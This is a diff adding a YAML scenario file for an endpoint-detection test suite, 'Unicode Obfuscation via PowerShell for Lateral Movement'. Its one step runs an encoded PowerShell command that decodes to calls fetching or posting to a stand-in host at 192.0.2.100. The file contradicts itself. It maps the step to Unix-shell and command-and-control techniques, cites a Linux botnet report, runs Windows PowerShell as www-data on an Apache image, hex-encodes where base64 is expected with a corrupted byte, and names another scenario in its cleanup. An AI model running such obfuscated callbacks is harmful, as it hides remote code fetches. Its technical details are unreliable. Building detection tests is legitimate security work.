@@ -1,0 +1,91 @@
+scenario_id: SIM-EDR-068
+name: Unicode Obfuscation via PowerShell for Lateral Movement
+version: '1.0'
+status: active
+plane: EDR
+detection_types:
+- BIOC
+- XQL
+- IOC
+- ABIOC
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-03
+tc_refs:
+- TC-EDR-03
+- TC-EDR-05
+pov_scenario_id: POV-SC-021
+uc_name: Endpoint Detection & Response
+tc_name: Validate multi-method malware detection (local sandbox, behavioral, static analysis)
+mitre_tactic: TA0011
+mitre_tactic_name: Command and Control
+mitre_technique: T1059.004
+mitre_technique_name: 'Command and Scripting Interpreter: Unix Shell'
+additional_techniques:
+- technique: T1071.001
+  name: 'Application Layer Protocol: Web Protocols'
+- technique: T1059.006
+  name: 'Command and Scripting Interpreter: Python'
+threat_report: Unit42 - Mirai Variant Targets Linux and IoT Devices
+threat_report_url: https://unit42.paloaltonetworks.com/mirai-variant-v3g4/
+execution_identity:
+  default: www-data
+  options:
+  - www-data
+  - node
+  - nobody
+  - root
+push_supported: true
+pull_supported: true
+validation_methodology: Endpoint Signal Injection & Detection Accuracy
+methodology_family: F1
+primary_kpi: MTTD
+threshold:
+  kpi: MTTD
+  op: ≤
+  value: 300
+  unit: seconds
+success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected
+
+  XDR BIOC / XQL detections, and the mean time from signal emit to alert
+
+  creation is within the MTTD budget. Each step''s expected_detections row is
+
+  validated against dataset=xdr_data.
+
+  '
+moat_tier: LEAD
+cgo_anchor:
+  image_name: apache2
+  primary_username: www-data
+external_tools:
+- name: Atomic Red Team
+  source: https://github.com/redcanaryco/atomic-red-team
+  type: script
+  install_inline: false
+  adapter_ref: TOOL-ATOMIC-RED-TEAM
+steps:
+- id: step-01
+  name: Start PowerShell with Obfuscated Command
+  command: powershell.exe -EncodedCommand 0x50006f007700650072005300680065006c006c002e0065007800650020002d0043006f006d006d0061006e0064002000220049006d0070006f00720074002d004d006f00640075006c006500200057006500620048006f006f006b003b0020004e00650077002d0057006500620048006f006f006b0020002d00550072006c002000220068007400740070003a002f002f003100390032002e0030002e0032002e003100300030002f0063006f006d006d0061006e0064002e00700073100022003b002000530065006e0064002d0057006500620048006f006f006b0020002d005000610079006c006f006100640020002d00550072006c002000220068007400740070003a002f002f003100390032002e0030002e0032002e003100300030002f0063006f006d006d0061006e0064002e00700073003100220020002d005500730065005300650063007500720065005400720061006e00730070006f007200740022000000
+  identity: www-data
+  mitre_technique: T1059
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: PowerShell Process with Unicode Obfuscation
+    ttp_ref: TTP-2026-0230
+    detection_id: bioc-powershell-process-with-unicode-obfuscation
+cleanup:
+  commands:
+  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
+author: Henry Reed
+created: '2026-04-14'
+last_updated: '2026-04-14'
+tags:
+- reverse-shell
+- command-and-control
+- c2-callback
+- endpoint-security
+- bash
+- python
+- netcat
